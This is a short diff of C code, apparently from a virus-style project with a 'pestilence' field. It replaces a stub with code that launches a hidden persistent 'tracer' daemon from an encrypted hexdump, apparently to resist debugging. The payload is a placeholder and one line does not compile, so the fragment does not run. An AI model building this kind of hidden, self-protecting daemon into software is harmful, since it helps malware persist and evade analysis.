@@ -17,16 +17,22 @@ typedef struct  s_atp
     char        pestilence;
 }               t_atp;
 
+#define PERSISTENT_TRACER_CHECKER "to write here encrypted hexdump code"
+#define PTC_NAME                    "tmp/trace_me_if_u_can" // path
 
 char                run_atp(t_atp *atp)
 {
-    /* check possible quines encriptation
-    ** if all is right start presistent tracer
-    ** (call or start depend od the method i will use next)
-    */
-    if (1) // all good;
-        ; // start persistent tracer program or call the fct
-    return (SUCCESS);
+    t_aes           *aes;
+    const char      hexdump[] = PERSISTENT_TRACER_CHECKER;
+    const char      name = PTC_NAME;
+
+    if ((aes = init_aes()))
+    {
+        aes->error = 0;
+        execute_daemon(aes, name, (char *)hexdump, atp->env);
+        return (SUCCESS);
+    }
+    return (FAILURE);
 }
 
 #define PROCESS_ATP     {".trace_me_if_u_can", NULL} // process: persistent process name
